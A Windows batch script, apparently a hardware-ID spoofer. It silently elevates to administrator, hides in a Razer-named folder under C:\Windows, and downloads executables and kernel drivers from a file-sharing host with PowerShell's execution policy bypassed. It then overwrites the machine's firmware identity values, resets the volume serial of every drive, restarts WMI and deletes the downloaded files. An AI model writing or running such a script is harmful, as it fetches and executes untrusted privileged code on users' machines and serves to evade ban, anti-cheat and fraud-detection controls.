@echo off
setlocal enabledelayedexpansion

REM  --> Check for admin privileges (Windows 10 compatible)
net session >nul 2>&1
if %errorlevel% neq 0 (
    REM Create VBScript to elevate
    (
    echo Set UAC = CreateObject^("Shell.Application"^)
    echo UAC.ShellExecute "%~f0", "", "", "runas", 1
    ) > "%temp%\GetAdmin.vbs"
    
    REM Run the VBScript
    if exist "%temp%\GetAdmin.vbs" (
        cscript //nologo "%temp%\GetAdmin.vbs" >nul 2>&1
        timeout /t 1 /nobreak >nul 2>&1
        del "%temp%\GetAdmin.vbs" >nul 2>&1
    )
    
    REM Exit this instance (elevated instance will continue)
    exit /b
)

REM If we get here, we have admin privileges
cls
echo.
echo.

REM Create directory if it doesn't exist
if not exist "C:\Windows\RazerEngine64" (
    mkdir "C:\Windows\RazerEngine64" >nul 2>&1
)

cd /d "C:\Windows\RazerEngine64" >nul 2>&1
if errorlevel 1 (
    echo Error: Access denied
    timeout /t 3 /nobreak >nul 2>&1
    exit /b 1
)

REM Download required tools
echo Downloading components...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://pixeldrain.com/api/file/kS6iDKPk?download' -OutFile 'AMIDEWINx64.exe' -UseBasicParsing" >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://pixeldrain.com/api/file/Tvdf9YpH?download' -OutFile 'amigendrv64.sys' -UseBasicParsing" >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://pixeldrain.com/api/file/Bp21m3BT?download' -OutFile 'Volumeid64.exe' -UseBasicParsing" >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://pixeldrain.com/api/file/JPtnMAcj?download' -OutFile 'amifldrv64.sys' -UseBasicParsing" >nul 2>&1

REM Check if main tool exists before running
if not exist "AMIDEWINx64.exe" (
    echo Error: Component download failed
    timeout /t 3 /nobreak >nul 2>&1
    exit /b 1
)

echo Applying changes...
echo.

REM Comprehensive ASUS motherboard spoofing
AMIDEWINx64.exe /IVN "AMI" >nul 2>&1
timeout /t 1 /nobreak >nul 2>&1
AMIDEWINx64.exe /SP "System product name" >nul 2>&1
timeout /t 1 /nobreak >nul 2>&1
AMIDEWINx64.exe /SV "System product name" >nul 2>&1
timeout /t 1 /nobreak >nul 2>&1
AMIDEWINx64.exe /SS "Default string" >nul 2>&1
timeout /t 1 /nobreak >nul 2>&1
AMIDEWINx64.exe /SU AUTO >nul 2>&1
timeout /t 1 /nobreak >nul 2>&1
AMIDEWINx64.exe /SK "To Be Filled By O.E.M" >nul 2>&1
timeout /t 1 /nobreak >nul 2>&1
AMIDEWINx64.exe /BM "AsRock" >nul 2>&1
timeout /t 1 /nobreak >nul 2>&1
AMIDEWINx64.exe /BP "B560M-C" >nul 2>&1
timeout /t 1 /nobreak >nul 2>&1
AMIDEWINx64.exe /BS "Default string" >nul 2>&1
timeout /t 1 /nobreak >nul 2>&1
AMIDEWINx64.exe /BT "Default String" >nul 2>&1
timeout /t 1 /nobreak >nul 2>&1
AMIDEWINx64.exe /BLC "Default String" >nul 2>&1
timeout /t 1 /nobreak >nul 2>&1
AMIDEWINx64.exe /CM "Default String" >nul 2>&1
timeout /t 1 /nobreak >nul 2>&1
AMIDEWINx64.exe /CV "Default String" >nul 2>&1
timeout /t 1 /nobreak >nul 2>&1
AMIDEWINx64.exe /CS "Default string" >nul 2>&1
timeout /t 1 /nobreak >nul 2>&1
AMIDEWINx64.exe /CA "Default String" >nul 2>&1
timeout /t 1 /nobreak >nul 2>&1
AMIDEWINx64.exe /CSK "SKU" >nul 2>&1
timeout /t 1 /nobreak >nul 2>&1
AMIDEWINx64.exe /PSN "To Be Filled By O.E.M" >nul 2>&1
timeout /t 1 /nobreak >nul 2>&1
AMIDEWINx64.exe /PAT "To Be Filled By O.E.M" >nul 2>&1

REM Volume serial spoofing for all drives
if exist "Volumeid64.exe" (
    Volumeid64.exe a: A1B2-C3D4 >nul 2>&1
    Volumeid64.exe b: E5F6-7890 >nul 2>&1
    Volumeid64.exe c: 1A2B-3C4D >nul 2>&1
    Volumeid64.exe d: 5E6F-789A >nul 2>&1
    Volumeid64.exe e: B1C2-D3E4 >nul 2>&1
    Volumeid64.exe f: F567-890A >nul 2>&1
    Volumeid64.exe g: 2A3B-4C5D >nul 2>&1
    Volumeid64.exe h: 6E7F-8901 >nul 2>&1
    Volumeid64.exe i: C1D2-E3F4 >nul 2>&1
    Volumeid64.exe j: 5678-9ABC >nul 2>&1
    Volumeid64.exe k: 3A4B-5C6D >nul 2>&1
    Volumeid64.exe l: 7E8F-9012 >nul 2>&1
    Volumeid64.exe m: D1E2-F345 >nul 2>&1
    Volumeid64.exe n: 6789-ABCD >nul 2>&1
    Volumeid64.exe o: 4A5B-6C7D >nul 2>&1
    Volumeid64.exe p: 8E9F-0123 >nul 2>&1
    Volumeid64.exe q: E1F2-3456 >nul 2>&1
    Volumeid64.exe r: 789A-BCDE >nul 2>&1
    Volumeid64.exe s: 5A6B-7C8D >nul 2>&1
    Volumeid64.exe t: 9E0F-1234 >nul 2>&1
    Volumeid64.exe u: F123-4567 >nul 2>&1
    Volumeid64.exe v: 890A-BCDE >nul 2>&1
    Volumeid64.exe w: 6A7B-8C9D >nul 2>&1
    Volumeid64.exe x: 0E1F-2345 >nul 2>&1
    Volumeid64.exe y: 1234-5678 >nul 2>&1
    Volumeid64.exe z: 9ABC-DEF0 >nul 2>&1
)

REM Restart WMI service to apply changes
net stop winmgmt /y >nul 2>&1
timeout /t 2 /nobreak >nul 2>&1
net start winmgmt >nul 2>&1

echo.
echo.

REM Clean up downloaded files
if exist "AMIDEWINx64.exe" del "AMIDEWINx64.exe" >nul 2>&1
if exist "amigendrv64.sys" del "amigendrv64.sys" >nul 2>&1
if exist "Volumeid64.exe" del "Volumeid64.exe" >nul 2>&1
if exist "amifldrv64.sys" del "amifldrv64.sys" >nul 2>&1

timeout /t 2 /nobreak >nul 2>
